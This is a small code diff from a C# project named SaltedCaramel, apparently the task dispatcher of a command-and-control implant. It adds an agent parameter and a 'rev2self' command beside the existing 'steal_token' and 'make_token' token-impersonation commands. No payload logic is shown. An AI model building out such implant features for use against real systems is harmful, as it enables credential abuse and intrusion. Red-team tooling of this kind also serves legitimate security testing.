@@ -23,7 +23,7 @@ namespace SaltedCaramel.Tasks
         public static Credential Cred;
         // (username, (password, netonly))
 
-        public static void Execute(SCTask task)
+        public static void Execute(SCTask task, SCImplant agent)
         {
             if (task.command == "steal_token")
             {
@@ -32,6 +32,9 @@ namespace SaltedCaramel.Tasks
             else if (task.command == "make_token")
             {
                 MakeToken(task);
+            } else if (task.command == "rev2self")
+            {
+                Revert(task);
             }
         }
 
